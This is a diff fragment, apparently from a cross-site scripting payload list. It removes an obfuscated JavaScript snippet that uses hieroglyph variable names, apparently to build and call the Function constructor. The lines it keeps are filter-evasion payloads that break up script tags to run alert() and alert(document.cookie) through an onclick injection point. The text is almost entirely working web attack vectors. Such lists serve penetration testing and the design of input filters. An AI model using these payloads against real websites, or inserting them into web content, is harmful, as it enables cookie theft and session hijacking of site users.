@@ -9,11 +9,6 @@
 <a href=”#” onclick=”… var input=’controllable data here’; …”>
 
 
-𓅂='',𓂀=!𓅂+𓅂,𓁄=!𓂀+𓅂,𓊎=𓅂+{},𓆣=𓂀
-[𓅂++],𓊝=𓂀[𓇎=𓅂],𓏢=++𓇎+𓅂,𓆗=𓊎[𓇎+𓏢
-],𓂀[𓆗+=𓊎[𓅂]+(𓂀.𓁄+𓊎)[𓅂]+𓁄[𓏢]+𓆣+
-𓊝+𓂀[𓇎]+𓆗+𓆣+𓊎[𓅂]+𓊝][𓆗](𓁄[𓅂]+𓁄[
-𓇎]+𓂀[𓏢]+𓊝+𓆣+'`𓅂 𓏢 𓂀 𓁄 𓆣 𓊝 𓇎`')``
 
 <</div>script</div>>alert()<</div>/script</div>>
 <s\Cr\ipt\>alert(document\.cookie)<\/s\Cr\ipt\>\;\/>
